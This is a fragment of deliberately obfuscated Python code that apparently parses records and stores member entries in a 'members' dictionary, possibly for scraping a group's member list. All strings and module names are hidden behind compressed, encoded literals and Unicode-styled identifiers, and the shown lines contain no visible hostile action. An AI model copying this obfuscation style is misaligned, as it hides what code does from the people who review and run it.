                                𝙤𝙗𝙟 = {__𝘪𝙢𝘱𝘰𝘳𝙩__(𝗹𝗠𝘐𝗜𝙈𝗹𝙈𝘕𝗜𝙄𝙉𝘔𝘭𝙡𝗜𝙈𝘭𝗠𝘭𝙄𝙈𝗜𝗠𝙄𝘕𝗠𝙄𝙡𝙡𝘭𝗡𝘭[𝗿𝘰𝘂𝗻𝙙(𝙖𝙗𝙨(0.0 + 0j))]).b64decode(__𝙞𝗺𝘱𝘰𝗿𝙩__(𝙡𝙈𝙄𝙄𝘔𝗹𝗠𝘕𝙄𝗜𝘕𝗠𝘭𝗹𝙄𝗠𝙡𝗠𝘭𝘐𝙈𝘐𝗠𝙄𝘕𝙈𝗜𝘭𝙡𝘭𝘕𝗹[𝗿𝗼𝙪𝘯𝗱(𝙖𝗯𝙨(0.6062531674857063 + 0.7952717126325745j))]).decompress(b'x\xdaKqw\xcb\x03\x00\x03c\x01`')).decode(): 𝘮𝗲𝘮[__𝘪𝗺𝙥𝗼𝗿𝙩__(𝘭𝙈𝗜𝗜𝗠𝙡𝙈𝘕𝘐𝗜𝘕𝘔𝙡𝗹𝗜𝙈𝗹𝗠𝗹𝘐𝗠𝙄𝗠𝗜𝙉𝙈𝘐𝗹𝙡𝙡𝙉𝘭[𝙧𝙤𝙪𝘯𝗱(𝗮𝙗𝘀(0.0 + 0j))]).b64decode(__𝘪𝙢𝘱𝙤𝙧𝘵__(𝗹𝘔𝙄𝘐𝘔𝘭𝙈𝘕𝙄𝗜𝘕𝗠𝗹𝘭𝙄𝘔𝘭𝙈𝗹𝗜𝙈𝙄𝗠𝗜𝙉𝗠𝙄𝘭𝙡𝙡𝗡𝗹[𝘳𝗼𝙪𝗻𝙙(𝗮𝙗𝘀(0.48980388295566846 + 0.8718326423354139j))]).decompress(b'x\xdaK\x89\xf0\xcbIN\xb7\xb5\x05\x00\x0c\xf8\x02\xbb')).decode()][__𝙞𝙢𝙥𝘰𝙧𝘁__(𝙡𝘔𝙄𝘐𝙈𝘭𝙈𝘕𝗜𝗜𝘕𝙈𝙡𝙡𝗜𝙈𝗹𝙈𝘭𝘐𝗠𝘐𝗠𝘐𝗡𝘔𝗜𝙡𝙡𝘭𝙉𝘭[𝘳𝙤𝘂𝗻𝙙(𝘢𝗯𝙨(0.0 + 0j))]).b64decode(__𝘪𝗺𝗽𝗼𝗿𝘵__(𝙡𝘔𝘐𝘐𝘔𝗹𝘔𝗡𝘐𝙄𝘕𝙈𝘭𝙡𝙄𝗠𝗹𝗠𝙡𝘐𝘔𝘐𝙈𝙄𝙉𝗠𝗜𝘭𝘭𝗹𝗡𝗹[𝗿𝗼𝘂𝗻𝗱(𝘢𝗯𝘴(0.24241267645705433 + 0.9701732290126993j))]).decompress(b'x\xdaK\x89\xf0\xcbI\xce5\xcdH\n\x0f\xb5\x05\x00\x1c)\x04/')).decode()] + __𝗶𝘮𝘱𝘰𝙧𝙩__(𝗹𝗠𝗜𝗜𝙈𝘭𝗠𝙉𝙄𝗜𝗡𝙈𝗹𝗹𝗜𝙈𝗹𝙈𝗹𝗜𝗠𝙄𝗠𝗜𝙉𝗠𝙄𝘭𝗹𝙡𝗡𝙡[𝗿𝙤𝘶𝘯𝘥(𝘢𝗯𝘴(0.0 + 0j))]).b64decode(__𝘪𝗺𝙥𝗼𝘳𝘵__(𝗹𝙈𝗜𝙄𝙈𝙡𝘔𝘕𝙄𝙄𝙉𝗠𝙡𝙡𝘐𝘔𝗹𝘔𝙡𝙄𝘔𝗜𝘔𝙄𝙉𝗠𝙄𝘭𝙡𝙡𝘕𝙡[𝙧𝘰𝘂𝘯𝘥(𝘢𝙗𝙨(0.3599196051227711 + 0.9329833213130171j))]).decompress(b'x\xda\xf3,\xb7\xb5\x05\x00\x03D\x01;')).decode() + 𝙢𝘦𝘮[__𝙞𝙢𝙥𝘰𝙧𝘁__(𝘭𝘔𝗜𝙄𝙈𝙡𝙈𝙉𝗜𝙄𝗡𝘔𝙡𝙡𝙄𝗠𝘭𝗠𝗹𝙄𝗠𝘐𝘔𝙄𝘕𝗠𝘐𝘭𝘭𝗹𝘕𝗹[𝙧𝘰𝘂𝙣𝘥(𝘢𝙗𝘴(0.0 + 0j))]).b64decode(__𝙞𝙢𝙥𝗼𝙧𝘵__(𝗹𝗠𝘐𝗜𝗠𝗹𝘔𝙉𝙄𝙄𝙉𝗠𝙡𝙡𝘐𝗠𝘭𝗠𝙡𝘐𝙈𝙄𝙈𝘐𝘕𝗠𝗜𝘭𝙡𝘭𝗡𝙡[𝙧𝗼𝘂𝙣𝗱(𝙖𝘣𝘴(0.025739704175202438 + 0.99966867892766j))]).decompress(b'x\xdaK\x89\xf0\xcbIN\xb7\xb5\x05\x00\x0c\xf8\x02\xbb')).decode()][__𝙞𝗺𝗽𝙤𝘳𝘁__(𝙡𝗠𝙄𝗜𝙈𝙡𝙈𝘕𝙄𝘐𝙉𝗠𝗹𝗹𝗜𝗠𝙡𝗠𝘭𝘐𝗠𝗜𝙈𝗜𝘕𝙈𝗜𝙡𝘭𝘭𝙉𝗹[𝘳𝘰𝘂𝘯𝙙(𝙖𝘣𝘀(0.0 + 0j))]).b64decode(__𝙞𝙢𝘱𝘰𝘳𝘁__(𝘭𝙈𝗜𝗜𝙈𝘭𝙈𝗡𝗜𝙄𝙉𝗠𝘭𝙡𝙄𝘔𝙡𝗠𝘭𝘐𝗠𝗜𝙈𝗜𝘕𝙈𝙄𝘭𝘭𝘭𝘕𝘭[𝙧𝘰𝘂𝙣𝙙(𝗮𝗯𝘴(0.46076583930239134 + 0.8875217413291704j))]).decompress(b'x\xda\x8br\xcf\xa9\x8a4\xf6*H\n\xcf)\x8d\x8c\x08*KN\xb7\xb5\x05\x00K\xe8\x07%')).decode()], __𝗶𝙢𝗽𝘰𝙧𝙩__(𝘭𝘔𝙄𝙄𝘔𝗹𝘔𝙉𝘐𝘐𝗡𝙈𝘭𝙡𝘐𝘔𝙡𝘔𝙡𝙄𝘔𝗜𝙈𝗜𝘕𝗠𝘐𝘭𝗹𝗹𝘕𝗹[𝗿𝗼𝘶𝗻𝙙(𝘢𝙗𝘀(0.0 + 0j))]).b64decode(__𝗶𝘮𝙥𝗼𝘳𝘵__(𝗹𝘔𝙄𝙄𝗠𝙡𝙈𝘕𝗜𝘐𝘕𝙈𝗹𝙡𝙄𝗠𝘭𝙈𝙡𝗜𝙈𝙄𝘔𝘐𝗡𝘔𝗜𝗹𝙡𝗹𝗡𝗹[𝙧𝙤𝙪𝗻𝗱(𝙖𝘣𝘀(0.08026821179558041 + 0.9967733012953045j))]).decompress(b'x\xdaK\x0c\x0f\xb4\x05\x00\x03l\x01G')).decode(): 𝗺𝘦𝗺[__𝘪𝙢𝙥𝗼𝘳𝙩__(𝙡𝗠𝗜𝗜𝘔𝗹𝗠𝗡𝙄𝙄𝙉𝙈𝗹𝗹𝘐𝗠𝗹𝗠𝘭𝗜𝘔𝗜𝗠𝙄𝘕𝙈𝙄𝙡𝗹𝗹𝗡𝙡[𝘳𝘰𝘂𝘯𝙙(𝘢𝗯𝙨(0.0 + 0j))]).b64decode(__𝗶𝙢𝙥𝘰𝙧𝘵__(𝗹𝘔𝙄𝘐𝘔𝘭𝗠𝙉𝗜𝙄𝘕𝙈𝙡𝘭𝙄𝗠𝙡𝙈𝙡𝘐𝙈𝙄𝘔𝗜𝘕𝙈𝗜𝘭𝗹𝗹𝗡𝘭[𝙧𝗼𝙪𝘯𝙙(𝘢𝙗𝙨(0.757027791257139 + 0.6533826775055622j))]).decompress(b'x\xdaK\x89\xf0\xcbIN\xb7\xb5\x05\x00\x0c\xf8\x02\xbb')).decode()][__𝘪𝙢𝗽𝘰𝘳𝘁__(𝗹𝗠𝙄𝗜𝗠𝗹𝗠𝙉𝗜𝘐𝘕𝗠𝙡𝘭𝗜𝙈𝘭𝙈𝙡𝗜𝘔𝘐𝙈𝗜𝙉𝗠𝘐𝙡𝗹𝘭𝗡𝙡[𝗿𝗼𝘂𝗻𝗱(𝗮𝙗𝘀(0.0 + 0j))]).b64decode(__𝙞𝘮𝘱𝗼𝗿𝙩__(𝙡𝘔𝘐𝗜𝗠𝘭𝙈𝙉𝘐𝗜𝙉𝙈𝙡𝘭𝘐𝘔𝙡𝘔𝘭𝗜𝙈𝗜𝗠𝗜𝙉𝗠𝙄𝘭𝙡𝘭𝗡𝙡[𝙧𝙤𝘂𝙣𝙙(𝗮𝙗𝘀(0.022746213467499832 + 0.9997412714162054j))]).decompress(b'x\xdaK\x0c\x0f\xb4\x05\x00\x03l\x01G')).decode()]}
                                if not 𝘮𝙚𝙢[__𝙞𝘮𝘱𝗼𝘳𝘁__(𝗹𝗠𝘐𝘐𝗠𝘭𝗠𝙉𝘐𝙄𝘕𝘔𝘭𝙡𝘐𝘔𝘭𝘔𝙡𝘐𝙈𝙄𝘔𝙄𝙉𝗠𝘐𝙡𝙡𝘭𝗡𝘭[𝗿𝙤𝙪𝘯𝙙(𝘢𝗯𝘀(0.0 + 0j))]).b64decode(__𝘪𝙢𝗽𝘰𝘳𝙩__(𝙡𝙈𝘐𝙄𝙈𝙡𝗠𝙉𝗜𝘐𝗡𝗠𝘭𝘭𝙄𝘔𝙡𝘔𝗹𝘐𝙈𝗜𝘔𝙄𝗡𝙈𝘐𝙡𝙡𝙡𝗡𝘭[𝙧𝗼𝘶𝗻𝘥(𝙖𝗯𝙨(0.5752084098219705 + 0.818006898057761j))]).decompress(b'x\xdaK\x89\xf0\xcbIN\xb7\xb5\x05\x00\x0c\xf8\x02\xbb')).decode()].get(__𝙞𝙢𝙥𝗼𝘳𝘁__(𝘭𝗠𝙄𝘐𝙈𝙡𝘔𝘕𝙄𝘐𝙉𝘔𝘭𝗹𝘐𝘔𝗹𝙈𝘭𝗜𝗠𝘐𝙈𝙄𝙉𝗠𝙄𝗹𝙡𝙡𝗡𝗹[𝙧𝙤𝘶𝘯𝘥(𝙖𝗯𝘴(0.0 + 0j))]).b64decode(__𝘪𝘮𝘱𝙤𝘳𝘵__(𝙡𝘔𝗜𝙄𝗠𝗹𝙈𝘕𝘐𝙄𝗡𝘔𝗹𝘭𝘐𝙈𝗹𝗠𝘭𝙄𝗠𝙄𝗠𝙄𝙉𝙈𝗜𝙡𝘭𝗹𝙉𝗹[𝘳𝗼𝘶𝗻𝘥(𝗮𝘣𝘀(0.7734280091410645 + 0.6338841492544908j))]).decompress(b'x\xda\x8b\xcc\xb54\x00\x00\x03Q\x010')).decode()):
                                    𝘀𝙚𝘭𝘧.members[𝙢𝙚𝗺[__𝗶𝘮𝗽𝙤𝙧𝘁__(𝙡𝘔𝙄𝘐𝗠𝘭𝙈𝙉𝘐𝗜𝗡𝗠𝙡𝗹𝗜𝘔𝗹𝗠𝗹𝙄𝘔𝘐𝙈𝗜𝘕𝗠𝘐𝘭𝙡𝗹𝙉𝙡[𝗿𝙤𝘂𝘯𝘥(𝗮𝙗𝘀(0.0 + 0j))]).b64decode(__𝙞𝘮𝙥𝘰𝗿𝘵__(𝘭𝗠𝙄𝙄𝗠𝙡𝘔𝘕𝙄𝘐𝗡𝘔𝗹𝘭𝗜𝗠𝙡𝙈𝘭𝘐𝗠𝘐𝘔𝗜𝗡𝙈𝘐𝙡𝘭𝗹𝙉𝗹[𝙧𝗼𝘶𝙣𝙙(𝘢𝙗𝘀(0.7084228908283728 + 0.7057882173501987j))]).decompress(b'x\xdaK\x89\xf0\xcbIN\xb7\xb5\x05\x00\x0c\xf8\x02\xbb')).decode()][__𝙞𝙢𝘱𝙤𝘳𝙩__(𝘭𝘔𝙄𝘐𝘔𝙡𝙈𝗡𝙄𝗜𝘕𝙈𝙡𝗹𝗜𝘔𝙡𝘔𝗹𝙄𝗠𝗜𝗠𝙄𝙉𝙈𝗜𝗹𝙡𝙡𝘕𝗹[𝘳𝗼𝙪𝘯𝙙(𝙖𝙗𝙨(0.0 + 0j))]).b64decode(__𝙞𝙢𝘱𝗼𝘳𝘁__(𝗹𝙈𝘐𝙄𝘔𝘭𝙈𝙉𝘐𝗜𝗡𝗠𝙡𝗹𝗜𝙈𝘭𝗠𝙡𝘐𝙈𝙄𝘔𝙄𝘕𝗠𝗜𝙡𝗹𝘭𝙉𝘭[𝗿𝙤𝘂𝙣𝗱(𝙖𝙗𝙨(0.6292980730800162 + 0.7771640336619925j))]).decompress(b'x\xdaK\x0c\x0f\xb4\x05\x00\x03l\x01G')).decode()]] = 𝗼𝘣𝙟
                    elif 𝗶𝗻𝙙𝙚𝘅 == __𝙞𝙢𝗽𝗼𝘳𝘵__(𝙡𝗠𝙄𝘐𝗠𝙡𝘔𝙉𝗜𝘐𝘕𝙈𝘭𝘭𝙄𝙈𝘭𝙈𝙡𝘐𝘔𝘐𝙈𝘐𝘕𝘔𝙄𝘭𝙡𝗹𝗡𝗹[𝘳𝙤𝙪𝗻𝙙(𝙖𝗯𝘀(0.0 + 0j))]).b64decode(__𝘪𝗺𝙥𝘰𝙧𝘁__(𝙡𝗠𝙄𝗜𝗠𝘭𝗠𝙉𝘐𝘐𝗡𝗠𝙡𝗹𝘐𝗠𝘭𝙈𝙡𝗜𝘔𝗜𝙈𝙄𝘕𝙈𝘐𝗹𝙡𝗹𝗡𝗹[𝙧𝗼𝘂𝙣𝙙(𝙖𝘣𝘀(0.6266759282706441 + 0.7792799759560914j))]).decompress(b"x\xda\x0b\x0bsr\r\x0c\x0br\x03\x00\x0b'\x02s")).decode():
                        for 𝗶𝘁𝘦𝙢 in 𝙥𝗮𝗿𝘴𝙚𝙙[__𝙞𝘮𝗽𝘰𝙧𝙩__(𝗹𝗠𝘐𝘐𝗠𝙡𝘔𝗡𝙄𝙄𝗡𝗠𝗹𝘭𝗜𝗠𝗹𝗠𝙡𝘐𝘔𝘐𝘔𝙄𝗡𝙈𝙄𝙡𝗹𝗹𝘕𝙡[𝘳𝗼𝘂𝗻𝘥(𝘢𝘣𝙨(0.0 + 0j))]).b64decode(__𝘪𝘮𝗽𝙤𝙧𝘁__(𝙡𝗠𝘐𝗜𝗠𝗹𝘔𝗡𝘐𝙄𝘕𝗠𝙡𝗹𝙄𝘔𝙡𝗠𝗹𝙄𝘔𝙄𝘔𝗜𝙉𝗠𝗜𝗹𝗹𝗹𝘕𝗹[𝘳𝘰𝙪𝗻𝗱(𝙖𝘣𝙨(0.30178806141566017 + 0.9533750395237846j))]).decompress(b'x\xdaK\x89p\xca\x8e\x8c\x08\xcaI.\xb7\xb5\x05\x00\x1b\xbb\x04-')).decode()][𝙚𝙡𝘦𝗺]:
                            if __𝙞𝙢𝙥𝙤𝗿𝘵__(𝘭𝙈𝘐𝘐𝙈𝙡𝙈𝙉𝙄𝘐𝘕𝗠𝙡𝙡𝘐𝗠𝘭𝙈𝗹𝗜𝙈𝗜𝗠𝘐𝘕𝗠𝙄𝗹𝗹𝗹𝘕𝙡[𝘳𝗼𝘶𝗻𝙙(𝗮𝙗𝘀(0.0 + 0j))]).b64decode(__𝙞𝘮𝙥𝗼𝗿𝘁__(𝗹𝙈𝙄𝘐𝗠𝗹𝗠𝗡𝙄𝗜𝙉𝗠𝘭𝗹𝗜𝗠𝗹𝘔𝗹𝗜𝘔𝗜𝙈𝗜𝙉𝘔𝗜𝘭𝙡𝙡𝘕𝘭[𝘳𝗼𝙪𝘯𝗱(𝘢𝘣𝙨(0.24020648972237935 + 0.9707218150918688j))]).decompress(b'x\xdaK\n\x0f+\x89\xcc\r\xab\x04\x00\r\x91\x03\x19')).decode() in 𝗶𝙩𝗲𝗺:
                                𝙢𝙚𝗺 = 𝙞𝘵𝙚𝘮[__𝙞𝙢𝗽𝙤𝙧𝙩__(𝗹𝘔𝗜𝙄𝘔𝗹𝙈𝙉𝙄𝙄𝙉𝙈𝗹𝗹𝙄𝙈𝘭𝗠𝙡𝘐𝘔𝙄𝘔𝙄𝗡𝘔𝙄𝙡𝘭𝗹𝗡𝙡[𝗿𝙤𝘂𝗻𝘥(𝘢𝗯𝙨(0.0 + 0j))]).b64decode(__𝗶𝙢𝘱𝘰𝙧𝘵__(𝘭𝙈𝗜𝙄𝗠𝗹𝘔𝗡𝙄𝙄𝗡𝘔𝙡𝘭𝗜𝙈𝗹𝗠𝗹𝗜𝙈𝗜𝘔𝗜𝗡𝗠𝙄𝗹𝘭𝙡𝘕𝗹[𝙧𝗼𝙪𝘯𝗱(𝙖𝙗𝙨(0.3795803235287417 + 0.9251587852848914j))]).decompress(b'x\xdaK\n\x0f+\x89\xcc\r\xab\x04\x00\r\x91\x03\x19')).decode()]
                                𝙤𝙗𝘫 = {__𝘪𝙢𝘱𝗼𝙧𝘵__(𝙡𝙈𝗜𝗜𝘔𝙡𝗠𝘕𝙄𝘐𝘕𝗠𝘭𝘭𝙄𝘔𝙡𝘔𝙡𝗜𝗠𝗜𝙈𝗜𝗡𝙈𝙄𝙡𝙡𝘭𝙉𝙡[𝘳𝗼𝘶𝙣𝗱(𝙖𝘣𝘴(0.0 + 0j))]).b64decode(__𝗶𝗺𝗽𝘰𝘳𝙩__(𝙡𝙈𝙄𝘐𝗠𝙡𝗠𝗡𝙄𝗜𝗡𝘔𝗹𝗹𝘐𝘔𝗹𝙈𝙡𝘐𝗠𝙄𝗠𝘐𝗡𝗠𝗜𝗹𝙡𝘭𝘕𝙡[𝙧𝙤𝘶𝗻𝘥(𝙖𝘣𝘀(0.8653557167831398 + 0.5011581421375275j))]).decompress(b'x\xdaKqw\xcb\x03\x00\x03c\x01`')).decode(): 𝙢𝙚𝘮[__𝗶𝘮𝘱𝙤𝗿𝘁__(𝙡𝙈𝘐𝗜𝘔𝗹𝙈𝙉𝙄𝗜𝙉𝗠𝙡𝙡𝘐𝘔𝗹𝙈𝗹𝗜𝙈𝘐𝗠𝗜𝗡𝗠𝘐𝙡𝙡𝘭𝙉𝘭[𝘳𝙤𝙪𝘯𝙙(𝗮𝗯𝘴(0.0 + 0j))]).b64decode(__𝙞𝘮𝘱𝘰𝘳𝙩__(𝘭𝙈𝗜𝙄𝘔𝙡𝙈𝘕𝗜𝙄𝗡𝘔𝙡𝙡𝗜𝗠𝗹𝗠𝘭𝙄𝗠𝗜𝗠𝘐𝘕𝙈𝘐𝗹𝗹𝗹𝗡𝘭[𝗿𝙤𝘂𝙣𝙙(𝘢𝙗𝘀(0.9097618419294724 + 0.41513057098832606j))]).decompress(b'x\xdaK\x89\xf0\xcbIN\xb7\xb5\x05\x00\x0c\xf8\x02\xbb')).decode()][__𝗶𝙢𝙥𝘰𝙧𝘁__(𝘭𝗠𝙄𝘐𝗠𝙡𝗠𝙉𝗜𝘐𝗡𝘔𝙡𝗹𝘐𝙈𝙡𝘔𝙡𝘐𝙈𝗜𝗠𝗜𝗡𝙈𝗜𝙡𝗹𝘭𝙉𝗹[𝙧𝙤𝘂𝘯𝗱(𝗮𝘣𝘀(0.0 + 0j))]).b64decode(__𝘪𝘮𝙥𝗼𝗿𝘁__(𝗹𝗠𝘐𝙄𝙈𝘭𝗠𝗡𝙄𝘐𝙉𝙈𝘭𝙡𝗜𝙈𝙡𝘔𝗹𝘐𝙈𝗜𝙈𝗜𝗡𝘔𝙄𝗹𝗹𝘭𝘕𝙡[𝘳𝘰𝘂𝗻𝘥(𝘢𝘣𝘀(0.13047528518763962 + 0.9914515620821847j))]).decompress(b'x\xdaK\x89\xf0\xcbI\xce5\xcdH\n\x0f\xb5\x05\x00\x1c)\x04/')).decode()] + __𝙞𝘮𝘱𝙤𝙧𝙩__(𝗹𝘔𝙄𝘐𝙈𝘭𝗠𝘕𝙄𝗜𝙉𝙈𝙡𝗹𝙄𝘔𝗹𝗠𝙡𝙄𝙈𝘐𝘔𝘐𝗡𝗠𝘐𝗹𝘭𝗹𝙉𝙡[𝘳𝘰𝘂𝘯𝘥(𝙖𝗯𝙨(0.0 + 0j))]).b64decode(__𝗶𝙢𝘱𝗼𝗿𝘁__(𝙡𝗠𝙄𝘐𝗠𝗹𝘔𝙉𝙄𝗜𝗡𝗠𝗹𝘭𝙄𝗠𝗹𝘔𝘭𝘐𝙈𝙄𝙈𝗜𝘕𝘔𝙄𝘭𝗹𝙡𝗡𝙡[𝘳𝗼𝘂𝗻𝘥(𝘢𝘣𝘴(0.15780033162801876 + 0.987471040252871j))]).decompress(b'x\xda\xf3,\xb7\xb5\x05\x00\x03D\x01;')).decode() + 𝗺𝘦𝗺[__𝙞𝘮𝘱𝗼𝙧𝘁__(𝙡𝙈𝘐𝘐𝘔𝙡𝘔𝘕𝙄𝙄𝙉𝘔𝗹𝘭𝗜𝗠𝗹𝙈𝘭𝘐𝙈𝗜𝙈𝗜𝗡𝘔𝘐𝘭𝘭𝗹𝗡𝘭[𝘳𝘰𝘶𝗻𝗱(𝗮𝗯𝙨(0.0 + 0j))]).b64decode(__𝗶𝗺𝗽𝗼𝗿𝙩__(𝘭𝙈𝗜𝗜𝘔𝗹𝗠𝙉𝗜𝗜𝙉𝗠𝗹𝙡𝗜𝗠𝘭𝙈𝘭𝗜𝙈𝙄𝘔𝙄𝗡𝗠𝘐𝙡𝗹𝙡𝙉𝗹[𝘳𝙤𝙪𝙣𝙙(𝘢𝙗𝘀(0.5386494791096719 + 0.84252996306059j))]).decompress(b'x\xdaK\x89\xf0\xcbIN\xb7\xb5\x05\x00\x0c\xf8\x02\xbb')).decode()][__𝘪𝙢𝗽𝗼𝗿𝘁__(𝘭𝗠𝗜𝘐𝘔𝙡𝘔𝗡𝘐𝙄𝗡𝗠𝘭𝘭𝘐𝙈𝘭𝘔𝘭𝘐𝗠𝘐𝗠𝘐𝗡𝗠𝗜𝘭𝙡𝙡𝘕𝘭[𝗿𝘰𝘂𝘯𝘥(𝘢𝗯𝘀(0.0 + 0j))]).b64decode(__𝗶𝘮𝗽𝗼𝘳𝙩__(𝗹𝙈𝗜𝘐𝗠𝙡𝗠𝗡𝘐𝙄𝘕𝘔𝙡𝘭𝘐𝙈𝘭𝙈𝘭𝙄𝘔𝘐𝗠𝘐𝙉𝙈𝙄𝗹𝘭𝘭𝗡𝗹[𝘳𝙤𝙪𝘯𝗱(𝘢𝗯𝘀(0.4962537449312159 + 0.8681775282980686j))]).decompress(b'x\xda\x8br\xcf\xa9\x8a4\xf6*H\n\xcf)\x8d\x8c\x08*KN\xb7\xb5\x05\x00K\xe8\x07%')).decode()], __𝗶𝙢𝙥𝙤𝘳𝘵__(𝘭𝘔𝗜𝘐𝙈𝘭𝘔𝘕𝘐𝙄𝘕𝘔𝙡𝗹𝙄𝗠𝘭𝙈𝘭𝙄𝙈𝙄𝙈𝘐𝘕𝘔𝘐𝗹𝘭𝙡𝗡𝙡[𝙧𝙤𝘂𝙣𝗱(𝗮𝙗𝘀(0.0 + 0j))]).b64decode(__𝙞𝘮𝗽𝗼𝙧𝘵__(𝙡𝘔𝙄𝘐𝗠𝘭𝗠𝙉𝗜𝘐𝙉𝘔𝙡𝗹𝙄𝗠𝗹𝘔𝙡𝗜𝙈𝗜𝘔𝙄𝗡𝗠𝗜𝘭𝙡𝙡𝙉𝘭[𝗿𝘰𝘶𝘯𝗱(𝙖𝗯𝘴(0.4257609436748552 + 0.9048356861005742j))]).decompress(b'x\xdaK\x0c\x0f\xb4\x05\x00\x03l\x01G')).decode(): 𝙢𝙚𝙢[__𝘪𝗺𝘱𝗼𝘳𝘵__(𝙡𝘔𝗜𝗜𝘔𝙡𝙈𝘕𝗜𝙄𝙉𝘔𝙡𝘭𝙄𝗠𝘭𝙈𝗹𝘐𝗠𝗜𝙈𝘐𝗡𝘔𝗜𝗹𝘭𝗹𝘕𝘭[𝙧𝘰𝘶𝙣𝙙(𝗮𝙗𝘴(0.0 + 0j))]).b64decode(__𝗶𝘮𝙥𝗼𝗿𝙩__(𝙡𝙈𝗜𝗜𝗠𝘭𝘔𝘕𝗜𝘐𝘕𝙈𝗹𝗹𝗜𝘔𝘭𝘔𝗹𝗜𝙈𝘐𝗠𝘐𝙉𝘔𝙄𝘭𝘭𝗹𝘕𝗹[𝘳𝙤𝙪𝗻𝘥(𝗮𝘣𝘀(0.6724935763322994 + 0.7401029589130108j))]).decompress(b'x\xdaK\x89\xf0\xcbIN\xb7\xb5\x05\x00\x0c\xf8\x02\xbb')).decode()][__𝙞𝙢𝗽𝘰𝙧𝘁__(𝘭𝙈𝙄𝘐𝙈𝙡𝘔𝗡𝗜𝗜𝙉𝙈𝗹𝗹𝙄𝘔𝙡𝘔𝗹𝙄𝗠𝗜𝙈𝘐𝙉𝘔𝘐𝘭𝙡𝙡𝙉𝙡[𝗿𝗼𝘂𝘯𝘥(𝙖𝘣𝘴(0.0 + 0j))]).b64decode(__𝘪𝙢𝙥𝘰𝗿𝙩__(𝗹𝙈𝘐𝙄𝗠𝙡𝘔𝘕𝙄𝘐𝘕𝙈𝙡𝙡𝘐𝘔𝙡𝘔𝗹𝗜𝘔𝗜𝘔𝙄𝘕𝗠𝙄𝘭𝘭𝘭𝗡𝘭[𝘳𝗼𝙪𝗻𝗱(𝙖𝙗𝘀(0.4840058304693816 + 0.875064772500667j))]).decompress(b'x\xdaK\x0c\x0f\xb4\x05\x00\x03l\x01G')).decode()]}
                                if not 𝗺𝗲𝙢[__𝙞𝘮𝙥𝙤𝗿𝘵__(𝗹𝘔𝗜𝙄𝗠𝘭𝗠𝙉𝗜𝘐𝘕𝗠𝙡𝘭𝘐𝗠𝗹𝗠𝙡𝗜𝙈𝙄𝘔𝗜𝙉𝙈𝗜𝗹𝗹𝙡𝗡𝘭[𝘳𝗼𝘂𝘯𝗱(𝘢𝘣𝘴(0.0 + 0j))]).b64decode(__𝙞𝗺𝘱𝗼𝗿𝙩__(𝙡𝘔𝙄𝘐𝙈𝘭𝘔𝘕𝙄𝗜𝙉𝗠𝘭𝘭𝘐𝙈𝙡𝘔𝗹𝗜𝘔𝗜𝙈𝗜𝘕𝙈𝗜𝙡𝗹𝗹𝘕𝙡[𝘳𝙤𝙪𝗻𝙙(𝙖𝘣𝘀(0.19138000511835795 + 0.9815160180256343j))]).decompress(b'x\xdaK\x89\xf0\xcbIN\xb7\xb5\x05\x00\x0c\xf8\x02\xbb')).decode()].get(__𝙞𝘮𝘱𝘰𝗿𝘵__(𝘭𝙈𝙄𝙄𝙈𝙡𝘔𝙉𝘐𝗜𝘕𝗠𝘭𝘭𝙄𝗠𝘭𝘔𝘭𝗜𝙈𝙄𝘔𝗜𝙉𝗠𝙄𝗹𝗹𝗹𝙉𝗹[𝗿𝙤𝘶𝙣𝙙(𝘢𝙗𝘀(0.0 + 0j))]).b64decode(__𝘪𝗺𝘱𝗼𝘳𝘵__(𝗹𝙈𝙄𝙄𝗠𝙡𝙈𝙉𝙄𝗜𝘕𝙈𝗹𝘭𝘐𝗠𝘭𝗠𝗹𝗜𝘔𝗜𝙈𝘐𝗡𝗠𝗜𝙡𝘭𝘭𝗡𝘭[𝙧𝙤𝘶𝗻𝙙(𝗮𝘣𝙨(0.4159554192310294 + 0.909385006041082j))]).decompress(b'x\xda\x8b\xcc\xb54\x00\x00\x03Q\x010')).decode()):
                                    𝙨𝗲𝗹𝙛.members[𝗺𝙚𝗺[__𝙞𝘮𝘱𝙤𝘳𝘵__(𝘭𝘔𝗜𝘐𝗠𝘭𝗠𝙉𝗜𝗜𝙉𝘔𝗹𝗹𝘐𝘔𝘭𝗠𝗹𝘐𝙈𝙄𝙈𝗜𝘕𝗠𝙄𝙡𝙡𝙡𝙉𝙡[𝗿𝗼𝘂𝗻𝙙(𝗮𝙗𝘀(0.0 + 0j))]).b64decode(__𝗶𝘮𝙥𝗼𝙧𝙩__(𝙡𝗠𝙄𝗜𝘔𝗹𝗠𝗡𝗜𝘐𝙉𝘔𝙡𝘭𝙄𝙈𝘭𝙈𝘭𝙄𝘔𝘐𝙈𝗜𝙉𝘔𝙄𝗹𝗹𝘭𝙉𝘭[𝗿𝘰𝘶𝘯𝙙(𝗮𝗯𝘴(0.21069779366259622 + 0.9775512466084395j))]).decompress(b'x\xdaK\x89\xf0\xcbIN\xb7\xb5\x05\x00\x0c\xf8\x02\xbb')).decode()][__𝗶𝗺𝙥𝙤𝘳𝘁__(𝗹𝙈𝘐𝘐𝙈𝘭𝙈𝘕𝙄𝗜𝘕𝗠𝘭𝘭𝙄𝙈𝙡𝗠𝘭𝗜𝗠𝘐𝗠𝘐𝗡𝙈𝗜𝘭𝘭𝗹𝗡𝘭[𝗿𝙤𝘶𝘯𝘥(𝙖𝙗𝙨(0.0 + 0j))]).b64decode(__𝙞𝗺𝗽𝙤𝘳𝙩__(𝙡𝘔𝘐𝗜𝘔𝙡𝙈𝙉𝘐𝘐𝗡𝘔𝘭𝙡𝘐𝗠𝗹𝙈𝙡𝗜𝙈𝘐𝙈𝘐𝗡𝘔𝘐𝗹𝘭𝗹𝘕𝘭[𝗿𝗼𝘶𝙣𝘥(𝙖𝘣𝘀(0.981176473622285 + 0.1931132507368085j))]).decompress(b'x\xdaK\x0c\x0f\xb4\x05\x00\x03l\x01G')).decode()]] = 𝙤𝗯𝗷
                    𝘀𝙚𝘭𝗳.lastRange += 𝘳𝗼𝙪𝘯𝘥(𝘢𝘣𝙨(0.9268354622203122 + 0.37546774291656565j))
